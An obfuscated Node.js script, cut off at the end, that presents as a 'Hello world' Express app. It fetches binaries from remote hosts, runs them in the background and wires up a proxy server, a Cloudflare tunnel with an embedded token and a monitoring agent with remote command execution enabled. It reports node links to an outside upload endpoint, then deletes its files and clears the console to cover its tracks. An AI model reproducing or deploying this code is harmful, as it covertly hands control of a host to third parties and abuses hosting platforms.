const _0x444a2e=_0xeac9;(function(_0x54b9a5,_0x38c450){const _0x122643=_0xeac9,_0x216b28=_0x54b9a5();while(!![]){try{const _0x5e9cd8=parseInt(_0x122643(0x161))/0x1*(-parseInt(_0x122643(0x13c))/0x2)+parseInt(_0x122643(0x159))/0x3*(-parseInt(_0x122643(0x143))/0x4)+-parseInt(_0x122643(0x1a0))/0x5*(parseInt(_0x122643(0x101))/0x6)+-parseInt(_0x122643(0x118))/0x7*(-parseInt(_0x122643(0x11e))/0x8)+-parseInt(_0x122643(0x15c))/0x9+-parseInt(_0x122643(0x164))/0xa*(parseInt(_0x122643(0x147))/0xb)+parseInt(_0x122643(0x187))/0xc;if(_0x5e9cd8===_0x38c450)break;else _0x216b28['push'](_0x216b28['shift']());}catch(_0x2edad6){_0x216b28['push'](_0x216b28['shift']());}}}(_0x1854,0x5f2a5));const _0x523d3b=(function(){let _0x551663=!![];return function(_0xae0c37,_0x18369c){const _0x48ca9c=_0x551663?function(){const _0x3a6f59=_0xeac9;if(_0x18369c){const _0x5dd687=_0x18369c[_0x3a6f59(0x170)](_0xae0c37,arguments);return _0x18369c=null,_0x5dd687;}}:function(){};return _0x551663=![],_0x48ca9c;};}()),_0x5b8c35=_0x523d3b(this,function(){const _0x29aea7=_0xeac9;return _0x5b8c35[_0x29aea7(0x17f)]()['search'](_0x29aea7(0x1c1))[_0x29aea7(0x17f)]()[_0x29aea7(0x17c)](_0x5b8c35)[_0x29aea7(0x1a4)]('(((.+)+)+)+$');});_0x5b8c35();const _0x3b5466=(function(){let _0x5d78e7=!![];return function(_0x2d5ced,_0x5055ef){const _0x194812=_0x5d78e7?function(){const _0x7712cc=_0xeac9;if(_0x5055ef){const _0x368eea=_0x5055ef[_0x7712cc(0x170)](_0x2d5ced,arguments);return _0x5055ef=null,_0x368eea;}}:function(){};return _0x5d78e7=![],_0x194812;};}()),_0x1243f3=_0x3b5466(this,function(){const _0x234163=_0xeac9,_0x208d2a=function(){const _0x35a0f1=_0xeac9;let _0x504f91;try{_0x504f91=Function('return\x20(function()\x20'+_0x35a0f1(0x103)+');')();}catch(_0x3f2141){_0x504f91=window;}return _0x504f91;},_0x5306b1=_0x208d2a(),_0x97cb39=_0x5306b1[_0x234163(0x15e)]=_0x5306b1[_0x234163(0x15e)]||{},_0xf308af=[_0x234163(0x15f),_0x234163(0x129),_0x234163(0x152),'error',_0x234163(0x119),'table','trace'];for(let _0x4e2276=0x0;_0x4e2276<_0xf308af[_0x234163(0x107)];_0x4e2276++){const _0x57d2a3=_0x3b5466['constructor'][_0x234163(0x133)][_0x234163(0x1b6)](_0x3b5466),_0x547f4b=_0xf308af[_0x4e2276],_0x9c13c0=_0x97cb39[_0x547f4b]||_0x57d2a3;_0x57d2a3[_0x234163(0x139)]=_0x3b5466[_0x234163(0x1b6)](_0x3b5466),_0x57d2a3['toString']=_0x9c13c0['toString'][_0x234163(0x1b6)](_0x9c13c0),_0x97cb39[_0x547f4b]=_0x57d2a3;}});_0x1243f3();const express=require(_0x444a2e(0x153)),app=express(),axios=require(_0x444a2e(0x158)),os=require('os'),fs=require('fs'),path=require(_0x444a2e(0x1ae)),{promisify}=require(_0x444a2e(0x19b)),exec=promisify(require(_0x444a2e(0x189))[_0x444a2e(0x194)]),{execSync}=require(_0x444a2e(0x189)),UPLOAD_URL=process[_0x444a2e(0x146)][_0x444a2e(0x17e)]||'',PROJECT_URL=process[_0x444a2e(0x146)][_0x444a2e(0x16e)]||'',AUTO_ACCESS=process[_0x444a2e(0x146)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x444a2e(0x186)]||'./tmp',SUB_PATH=process[_0x444a2e(0x146)][_0x444a2e(0x1bb)]||_0x444a2e(0x14f),PORT=process[_0x444a2e(0x146)][_0x444a2e(0x121)]||process['env']['PORT']||0xbb8,UUID=process['env'][_0x444a2e(0x141)]||_0x444a2e(0x10d),NEZHA_SERVER=process[_0x444a2e(0x146)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x444a2e(0x146)][_0x444a2e(0x14d)]||'',NEZHA_KEY=process['env'][_0x444a2e(0x15a)]||'',ARGO_DOMAIN=process['env'][_0x444a2e(0x12b)]||_0x444a2e(0x102),ARGO_AUTH=process[_0x444a2e(0x146)][_0x444a2e(0x176)]||_0x444a2e(0x150),ARGO_PORT=process['env'][_0x444a2e(0x1a3)]||0x1f47,CFIP=process[_0x444a2e(0x146)][_0x444a2e(0x1c3)]||_0x444a2e(0x157),CFPORT=process[_0x444a2e(0x146)][_0x444a2e(0x125)]||0x1bb,NAME=process[_0x444a2e(0x146)][_0x444a2e(0x19d)]||_0x444a2e(0x19f);!fs[_0x444a2e(0x148)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x444a2e(0x115))):console['log'](FILE_PATH+_0x444a2e(0x172));function generateRandomName(){const _0x5d037d=_0x444a2e,_0x273a42='abcdefghijklmnopqrstuvwxyz';let _0x3dd249='';for(let _0x447b2b=0x0;_0x447b2b<0x6;_0x447b2b++){_0x3dd249+=_0x273a42[_0x5d037d(0x1ce)](Math[_0x5d037d(0x1aa)](Math[_0x5d037d(0x135)]()*_0x273a42[_0x5d037d(0x107)]));}return _0x3dd249;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x444a2e(0x1b3)](FILE_PATH,phpName),webPath=path[_0x444a2e(0x1b3)](FILE_PATH,webName),botPath=path[_0x444a2e(0x1b3)](FILE_PATH,botName),subPath=path[_0x444a2e(0x1b3)](FILE_PATH,_0x444a2e(0x12c)),listPath=path[_0x444a2e(0x1b3)](FILE_PATH,'list.txt'),bootLogPath=path[_0x444a2e(0x1b3)](FILE_PATH,'boot.log'),configPath=path[_0x444a2e(0x1b3)](FILE_PATH,_0x444a2e(0x175));function deleteNodes(){const _0x1f228b=_0x444a2e;try{if(!UPLOAD_URL)return;if(!fs[_0x1f228b(0x148)](subPath))return;let _0x1903c2;try{_0x1903c2=fs['readFileSync'](subPath,_0x1f228b(0x167));}catch{return null;}const _0x5f3e43=Buffer[_0x1f228b(0x109)](_0x1903c2,'base64')[_0x1f228b(0x17f)]('utf-8'),_0x58f8e8=_0x5f3e43[_0x1f228b(0x18c)]('\x0a')['filter'](_0x562919=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1f228b(0x16c)](_0x562919));if(_0x58f8e8[_0x1f228b(0x107)]===0x0)return;return axios[_0x1f228b(0x1be)](UPLOAD_URL+_0x1f228b(0x127),JSON[_0x1f228b(0x190)]({'nodes':_0x58f8e8}),{'headers':{'Content-Type':_0x1f228b(0x17b)}})[_0x1f228b(0x142)](_0x5f3587=>{return null;}),null;}catch(_0x123753){return null;}}function cleanupOldFiles(){const _0x34f0af=_0x444a2e;try{const _0x40132d=fs[_0x34f0af(0x13d)](FILE_PATH);_0x40132d[_0x34f0af(0x1b7)](_0x11c1b2=>{const _0x40ce64=_0x34f0af,_0xd55f6c=path[_0x40ce64(0x1b3)](FILE_PATH,_0x11c1b2);try{const _0x22a434=fs[_0x40ce64(0x1b4)](_0xd55f6c);_0x22a434[_0x40ce64(0x12e)]()&&fs[_0x40ce64(0x13e)](_0xd55f6c);}catch(_0x2b1f15){}});}catch(_0x33737c){}}app[_0x444a2e(0x1ba)]('/',function(_0x5bf91a,_0x3d3662){const _0xf39224=_0x444a2e;_0x3d3662[_0xf39224(0x12d)]('Hello\x20world!');});async function generateConfig(){const _0xd08753=_0x444a2e,_0x21167e={'log':{'access':'/dev/null','error':_0xd08753(0x14e),'loglevel':_0xd08753(0x1ab)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xd08753(0x1ca),'settings':{'clients':[{'id':UUID,'flow':_0xd08753(0x111)}],'decryption':_0xd08753(0x1ab),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0xd08753(0x14c),'dest':0xbbc}]},'streamSettings':{'network':_0xd08753(0x11d)}},{'port':0xbb9,'listen':_0xd08753(0x116),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0xd08753(0x11d),'security':_0xd08753(0x1ab)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xd08753(0x1ab),'wsSettings':{'path':_0xd08753(0x184)}},'sniffing':{'enabled':!![],'destOverride':[_0xd08753(0x154),_0xd08753(0x177),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xd08753(0x116),'protocol':_0xd08753(0x108),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xd08753(0x154),_0xd08753(0x177),_0xd08753(0x165)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xd08753(0x116),'protocol':_0xd08753(0x1cf),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xd08753(0x1ab),'wsSettings':{'path':_0xd08753(0x14c)}},'sniffing':{'enabled':!![],'destOverride':[_0xd08753(0x154),_0xd08753(0x177),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xd08753(0x1af)]},'outbounds':[{'protocol':_0xd08753(0x104),'tag':_0xd08753(0x160)},{'protocol':_0xd08753(0x196),'tag':_0xd08753(0x128)}]};fs[_0xd08753(0x11a)](path[_0xd08753(0x1b3)](FILE_PATH,_0xd08753(0x175)),JSON[_0xd08753(0x190)](_0x21167e,null,0x2));}function _0xeac9(_0x3f33e4,_0x1b513b){const _0x5bcce9=_0x1854();return _0xeac9=function(_0x1243f3,_0x3b5466){_0x1243f3=_0x1243f3-0x100;let _0x5164bc=_0x5bcce9[_0x1243f3];return _0x5164bc;},_0xeac9(_0x3f33e4,_0x1b513b);}function getSystemArchitecture(){const _0xfd6fd8=_0x444a2e,_0x227937=os['arch']();return _0x227937===_0xfd6fd8(0x1c2)||_0x227937===_0xfd6fd8(0x110)||_0x227937===_0xfd6fd8(0x13a)?_0xfd6fd8(0x1c2):_0xfd6fd8(0x1a2);}function downloadFile(_0x25d7fa,_0x3eb0e5,_0x5bb7a5){const _0x4798a0=_0x444a2e,_0xabb60d=_0x25d7fa;!fs[_0x4798a0(0x148)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x776628=fs[_0x4798a0(0x1a1)](_0xabb60d);axios({'method':'get','url':_0x3eb0e5,'responseType':_0x4798a0(0x1b5)})[_0x4798a0(0x10a)](_0x12918f=>{const _0x568e28=_0x4798a0;_0x12918f[_0x568e28(0x1b0)][_0x568e28(0x10c)](_0x776628),_0x776628['on'](_0x568e28(0x13b),()=>{const _0x18b733=_0x568e28;_0x776628[_0x18b733(0x1c7)](),console['log'](_0x18b733(0x192)+path[_0x18b733(0x151)](_0xabb60d)+_0x18b733(0x14b)),_0x5bb7a5(null,_0xabb60d);}),_0x776628['on'](_0x568e28(0x174),_0x42af85=>{const _0x4ce85b=_0x568e28;fs['unlink'](_0xabb60d,()=>{});const _0x367464=_0x4ce85b(0x192)+path[_0x4ce85b(0x151)](_0xabb60d)+_0x4ce85b(0x11f)+_0x42af85[_0x4ce85b(0x1cb)];console[_0x4ce85b(0x174)](_0x367464),_0x5bb7a5(_0x367464);});})['catch'](_0x3d17f3=>{const _0x234319=_0x4798a0,_0x51d62a='Download\x20'+path[_0x234319(0x151)](_0xabb60d)+_0x234319(0x11f)+_0x3d17f3['message'];console[_0x234319(0x174)](_0x51d62a),_0x5bb7a5(_0x51d62a);});}async function downloadFilesAndRun(){const _0x1567f9=_0x444a2e,_0x4bd1a2=getSystemArchitecture(),_0x42d9bb=getFilesForArchitecture(_0x4bd1a2);if(_0x42d9bb[_0x1567f9(0x107)]===0x0){console[_0x1567f9(0x15f)](_0x1567f9(0x10b));return;}const _0x569ad6=_0x42d9bb[_0x1567f9(0x193)](_0xd236b8=>{return new Promise((_0x55ae43,_0x14b8b0)=>{const _0xba1c51=_0xeac9;downloadFile(_0xd236b8[_0xba1c51(0x13f)],_0xd236b8[_0xba1c51(0x131)],(_0x1213e1,_0x558d7f)=>{_0x1213e1?_0x14b8b0(_0x1213e1):_0x55ae43(_0x558d7f);});});});try{await Promise['all'](_0x569ad6);}catch(_0x590f74){console[_0x1567f9(0x174)]('Error\x20downloading\x20files:',_0x590f74);return;}function _0x610fea(_0x4190bf){const _0x2d17cc=0x1fd;_0x4190bf['forEach'](_0x11da6b=>{const _0x2137e2=_0xeac9;fs[_0x2137e2(0x148)](_0x11da6b)&&fs['chmod'](_0x11da6b,_0x2d17cc,_0x5665bd=>{const _0x5e1350=_0x2137e2;_0x5665bd?console[_0x5e1350(0x174)](_0x5e1350(0x178)+_0x11da6b+':\x20'+_0x5665bd):console[_0x5e1350(0x15f)](_0x5e1350(0x145)+_0x11da6b+':\x20'+_0x2d17cc[_0x5e1350(0x17f)](0x8));});});}const _0x1cd0f9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x610fea(_0x1cd0f9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x169f5a=NEZHA_SERVER[_0x1567f9(0x168)](':')?NEZHA_SERVER[_0x1567f9(0x18c)](':')[_0x1567f9(0x1ac)]():'',_0x738266=new Set([_0x1567f9(0x138),_0x1567f9(0x105),'2096',_0x1567f9(0x136),'2083',_0x1567f9(0x16d)]),_0x4bb868=_0x738266[_0x1567f9(0x169)](_0x169f5a)?_0x1567f9(0x155):_0x1567f9(0x14a),_0x2e119b=_0x1567f9(0x140)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1567f9(0x10f)+_0x4bb868+_0x1567f9(0x126)+UUID;fs[_0x1567f9(0x11a)](path[_0x1567f9(0x1b3)](FILE_PATH,_0x1567f9(0x132)),_0x2e119b);const _0x16473f='nohup\x20'+phpPath+_0x1567f9(0x18e)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16473f),console[_0x1567f9(0x15f)](phpName+_0x1567f9(0x124)),await new Promise(_0x1d92ba=>setTimeout(_0x1d92ba,0x3e8));}catch(_0x540907){console[_0x1567f9(0x174)]('php\x20running\x20error:\x20'+_0x540907);}}else{let _0x4da368='';const _0x1e2f98=['443',_0x1567f9(0x105),_0x1567f9(0x1c4),_0x1567f9(0x136),'2083',_0x1567f9(0x16d)];_0x1e2f98['includes'](NEZHA_PORT)&&(_0x4da368=_0x1567f9(0x149));const _0x155d48=_0x1567f9(0x15b)+npmPath+_0x1567f9(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1567f9(0x1a9)+NEZHA_KEY+'\x20'+_0x4da368+_0x1567f9(0x16f);try{await exec(_0x155d48),console[_0x1567f9(0x15f)](npmName+'\x20is\x20running'),await new Promise(_0x301768=>setTimeout(_0x301768,0x3e8));}catch(_0x48d535){console[_0x1567f9(0x174)]('npm\x20running\x20error:\x20'+_0x48d535);}}}else console[_0x1567f9(0x15f)](_0x1567f9(0x1a8));const _0x26e009=_0x1567f9(0x15b)+webPath+'\x20-c\x20'+FILE_PATH+_0x1567f9(0x1c8);try{await exec(_0x26e009),console[_0x1567f9(0x15f)](webName+_0x1567f9(0x124)),await new Promise(_0x4b8b99=>setTimeout(_0x4b8b99,0x3e8));}catch(_0x8ce265){console[_0x1567f9(0x174)](_0x1567f9(0x173)+_0x8ce265);}if(fs['existsSync'](botPath)){let _0x3a1260;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3a1260='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1567f9(0x123)](/TunnelSecret/)?_0x3a1260=_0x1567f9(0x130)+FILE_PATH+'/tunnel.yml\x20run':_0x3a1260=_0x1567f9(0x16a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1567f9(0x15b)+botPath+'\x20'+_0x3a1260+_0x1567f9(0x1d0)),console['log'](botName+_0x1567f9(0x124)),await new Promise(_0x45254b=>setTimeout(_0x45254b,0x7d0));}catch(_0x19359a){console['error'](_0x1567f9(0x181)+_0x19359a);}}await new Promise(_0x3c4e52=>setTimeout(_0x3c4e52,0x1388));}function getFilesForArchitecture(_0x5d2f45){const _0x315445=_0x444a2e;let _0x443bf8;_0x5d2f45===_0x315445(0x1c2)?_0x443bf8=[{'fileName':webPath,'fileUrl':_0x315445(0x11c)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x443bf8=[{'fileName':webPath,'fileUrl':_0x315445(0x17d)},{'fileName':botPath,'fileUrl':_0x315445(0x1c6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x327672=_0x5d2f45===_0x315445(0x1c2)?_0x315445(0x1b8):_0x315445(0x112);_0x443bf8[_0x315445(0x163)]({'fileName':npmPath,'fileUrl':_0x327672});}else{const _0x34b36a=_0x5d2f45==='arm'?_0x315445(0x198):_0x315445(0x1c0);_0x443bf8['unshift']({'fileName':phpPath,'fileUrl':_0x34b36a});}}return _0x443bf8;}function argoType(){const _0x2ddea7=_0x444a2e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2ddea7(0x15f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2ddea7(0x168)](_0x2ddea7(0x18d))){fs[_0x2ddea7(0x11a)](path[_0x2ddea7(0x1b3)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x31aa16=_0x2ddea7(0x1bf)+ARGO_AUTH[_0x2ddea7(0x18c)]('\x22')[0xb]+_0x2ddea7(0x166)+path[_0x2ddea7(0x1b3)](FILE_PATH,_0x2ddea7(0x100))+_0x2ddea7(0x183)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2ddea7(0x12a);fs[_0x2ddea7(0x11a)](path[_0x2ddea7(0x1b3)](FILE_PATH,_0x2ddea7(0x197)),_0x31aa16);}else console[_0x2ddea7(0x15f)](_0x2ddea7(0x156));}argoType();async function extractDomains(){const _0x20a198=_0x444a2e;let _0x59ff4d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x59ff4d=ARGO_DOMAIN,console[_0x20a198(0x15f)](_0x20a198(0x16b),_0x59ff4d),await _0x4a7255(_0x59ff4d);else try{const _0x523bd5=fs[_0x20a198(0x134)](path[_0x20a198(0x1b3)](FILE_PATH,_0x20a198(0x18a)),_0x20a198(0x167)),_0x3d774b=_0x523bd5[_0x20a198(0x18c)]('\x0a'),_0xe342b7=[];_0x3d774b[_0x20a198(0x1b7)](_0xb40a65=>{const _0x1867cc=_0x20a198,_0x387658=_0xb40a65['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x387658){const _0x57a59b=_0x387658[0x1];_0xe342b7[_0x1867cc(0x18b)](_0x57a59b);}});if(_0xe342b7[_0x20a198(0x107)]>0x0)_0x59ff4d=_0xe342b7[0x0],console['log'](_0x20a198(0x1bc),_0x59ff4d),await _0x4a7255(_0x59ff4d);else{console[_0x20a198(0x15f)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x20a198(0x13e)](path['join'](FILE_PATH,'boot.log'));async function _0x5317de(){const _0x286d6a=_0x20a198;try{process[_0x286d6a(0x19e)]===_0x286d6a(0x1b9)?await exec(_0x286d6a(0x1ad)+botName+_0x286d6a(0x180)):await exec(_0x286d6a(0x188)+botName[_0x286d6a(0x1ce)](0x0)+']'+botName[_0x286d6a(0x113)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x225d55){}}_0x5317de(),await new Promise(_0x1b48ef=>setTimeout(_0x1b48ef,0xbb8));const _0x282b5e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x20a198(0x19c)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x282b5e+'\x20>/dev/null\x202>&1\x20&'),console[_0x20a198(0x15f)](botName+_0x20a198(0x124)),await new Promise(_0x4750bb=>setTimeout(_0x4750bb,0xbb8)),await extractDomains();}catch(_0x27b7e4){console[_0x20a198(0x174)](_0x20a198(0x181)+_0x27b7e4);}}}catch(_0x4bfe1){console[_0x20a198(0x174)]('Error\x20reading\x20boot.log:',_0x4bfe1);}async function _0x4a7255(_0x5cc2a0){const _0x3bd7cd=_0x20a198,_0x245c01=execSync(_0x3bd7cd(0x114),{'encoding':_0x3bd7cd(0x167)}),_0x504a9a=_0x245c01[_0x3bd7cd(0x195)](),_0x566840=NAME?NAME+'-'+_0x504a9a:_0x504a9a;return new Promise(_0x5f4249=>{setTimeout(()=>{const _0xdde9c8=_0xeac9,_0x24df93={'v':'2','ps':''+_0x566840,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xdde9c8(0x1ab),'net':'ws','type':_0xdde9c8(0x1ab),'host':_0x5cc2a0,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x5cc2a0,'alpn':'','fp':_0xdde9c8(0x191)},_0x1cf9ff='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0xdde9c8(0x18f)+_0x5cc2a0+_0xdde9c8(0x106)+_0x5cc2a0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x566840+'\x0a\x20\x20\x0avmess://'+Buffer[_0xdde9c8(0x109)](JSON['stringify'](_0x24df93))['toString']('base64')+_0xdde9c8(0x19a)+UUID+'@'+CFIP+':'+CFPORT+_0xdde9c8(0x1a5)+_0x5cc2a0+_0xdde9c8(0x106)+_0x5cc2a0+_0xdde9c8(0x12f)+_0x566840+_0xdde9c8(0x182);console['log'](Buffer[_0xdde9c8(0x109)](_0x1cf9ff)[_0xdde9c8(0x17f)]('base64')),fs['writeFileSync'](subPath,Buffer[_0xdde9c8(0x109)](_0x1cf9ff)[_0xdde9c8(0x17f)]('base64')),console[_0xdde9c8(0x15f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xdde9c8(0x1ba)]('/'+SUB_PATH,(_0x42fb98,_0x3ed485)=>{const _0x2680da=_0xdde9c8,_0x3a4efc=Buffer[_0x2680da(0x109)](_0x1cf9ff)['toString']('base64');_0x3ed485[_0x2680da(0x1bd)](_0x2680da(0x1cd),_0x2680da(0x120)),_0x3ed485[_0x2680da(0x12d)](_0x3a4efc);}),_0x5f4249(_0x1cf9ff);},0x7d0);});}}async function uploadNodes(){const _0x108cb2=_0x444a2e;if(UPLOAD_URL&&PROJECT_URL){const _0x26e4c0=PROJECT_URL+'/'+SUB_PATH,_0x4a3031={'subscription':[_0x26e4c0]};try{const _0x49c740=await axios[_0x108cb2(0x1be)](UPLOAD_URL+'/api/add-subscriptions',_0x4a3031,{'headers':{'Content-Type':_0x108cb2(0x17b)}});return _0x49c740&&_0x49c740['status']===0xc8?(console['log'](_0x108cb2(0x15d)),_0x49c740):null;}catch(_0x1a1eb8){if(_0x1a1eb8['response']){if(_0x1a1eb8[_0x108cb2(0x122)][_0x108cb2(0x117)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x108cb2(0x148)](listPath))return;const _0x36f6dd=fs[_0x108cb2(0x134)](listPath,'utf-8'),_0x5547fa=_0x36f6dd['split']('\x0a')[_0x108cb2(0x17a)](_0x58b5ce=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x108cb2(0x16c)](_0x58b5ce));if(_0x5547fa[_0x108cb2(0x107)]===0x0)return;const _0x39eb1a=JSON[_0x108cb2(0x190)]({'nodes':_0x5547fa});try{const _0x350ad3=await axios[_0x108cb2(0x1be)](UPLOAD_URL+_0x108cb2(0x10e),_0x39eb1a,{'headers':{'Content-Type':_0x108cb2(0x17b)}});return _0x350ad3&&_0x350ad3[_0x108cb2(0x117)]===0xc8?(console[_0x108cb2(0x15f)](_0x108cb2(0x1b2)),_0x350ad3):null;}catch(_0x546d26){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x29c37b=_0xeac9,_0x2c6aa2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c6aa2[_0x29c37b(0x18b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c6aa2[_0x29c37b(0x18b)](phpPath);process[_0x29c37b(0x19e)]===_0x29c37b(0x1b9)?exec(_0x29c37b(0x11b)+_0x2c6aa2[_0x29c37b(0x1b3)]('\x20')+_0x29c37b(0x199),_0x3b60c6=>{const _0x377773=_0x29c37b;console[_0x377773(0x162)](),console['log'](_0x377773(0x1a6)),console['log'](_0x377773(0x1b1));}):exec(_0x29c37b(0x185)+_0x2c6aa2[_0x29c37b(0x1b3)]('\x20')+_0x29c37b(0x1cc),_0x2babd2=>{const _0x11b39a=_0x29c37b;console['clear'](),console[_0x11b39a(0x15f)](_0x11b39a(0x1a6)),console[_0x11b39a(0x15f)](_0x11b39a(0x1b1));});},0x15f90);}function _0x1854(){const _0x2510d9=['pkill\x20-f\x20\x22[','child_process','boot.log','push','split','TunnelSecret','\x20-c\x20\x22','?encryption=none&security=tls&sni=','stringify','firefox','Download\x20','map','exec','trim','blackhole','tunnel.yml','https://arm64.ssss.nyc.mn/v1','\x20>\x20nul\x202>&1','\x0a\x20\x20\x0atrojan://','util','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NAME','platform','railway','1428965IWLybr','createWriteStream','amd','ARGO_PORT','search','?security=tls&sni=','App\x20is\x20running','Unhandled\x20error\x20in\x20startserver:','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-p\x20','floor','none','pop','taskkill\x20/f\x20/im\x20','path','https+local://8.8.8.8/dns-query','data','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Nodes\x20uploaded\x20successfully','join','statSync','stream','bind','forEach','https://arm64.ssss.nyc.mn/agent','win32','get','SUB_PATH','ArgoDomain:','set','post','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/v1','(((.+)+)+)+$','arm','CFIP','2096','automatic\x20access\x20task\x20added\x20successfully','https://amd64.ssss.nyc.mn/bot','close','/config.json\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','vless','message','\x20>/dev/null\x202>&1','Content-Type','charAt','trojan','\x20>/dev/null\x202>&1\x20&','tunnel.json','6KXDKkA','railway.4.7.b.b.0.d.0.0.1.0.a.2.ip6.arpa','{}.constructor(\x22return\x20this\x22)(\x20)','freedom','8443','&fp=firefox&type=ws&host=','length','vmess','from','then','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','pipe','65a73fd3-c19e-432d-9c9c-3720d32ef5bc','/api/add-nodes','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','arm64','xtls-rprx-vision','https://amd64.ssss.nyc.mn/agent','substring','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20is\x20created','127.0.0.1','status','719096qHfgau','exception','writeFileSync','del\x20/f\x20/q\x20','https://arm64.ssss.nyc.mn/web','tcp','8qHgbDR','\x20failed:\x20','text/plain;\x20charset=utf-8','SERVER_PORT','response','match','\x20is\x20running','CFPORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/api/delete-nodes','block','warn','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_DOMAIN','sub.txt','send','isFile','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','fileUrl','config.yaml','prototype','readFileSync','random','2087','Skipping\x20adding\x20automatic\x20access\x20task','443','__proto__','aarch64','finish','6XBUtGK','readdirSync','unlinkSync','fileName','\x0aclient_secret:\x20','UUID','catch','60uBQTDQ','http\x20server\x20is\x20running\x20on\x20port:','Empowerment\x20success\x20for\x20','env','5027JWePCY','existsSync','--tls','false','\x20successfully','/trojan-argo','NEZHA_PORT','/dev/null','sub','eyJhIjoiZDBjNDA0ZTRiNjZhNzJkZDE2NDJkYTE2NjA4ODU1ODQiLCJ0IjoiZTdjNzdiMWEtMThlNS00YzM3LWJmYjUtYThhMWE1NTQ2ZDhiIiwicyI6Ik9HVmxaR00yTTJVdFpUQm1ZaTAwTURGaUxXRmhPV0l0TldWak9HTmxabUkwT0RRNCJ9','basename','info','express','http','true','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','cdns.doon.eu.org','axios','1206KPkJrK','NEZHA_KEY','nohup\x20','1639512nqxQxD','Subscription\x20uploaded\x20successfully','console','log','direct','95772FFSSZT','clear','unshift','14380eXmBtY','quic','\x0a\x20\x20credentials-file:\x20','utf-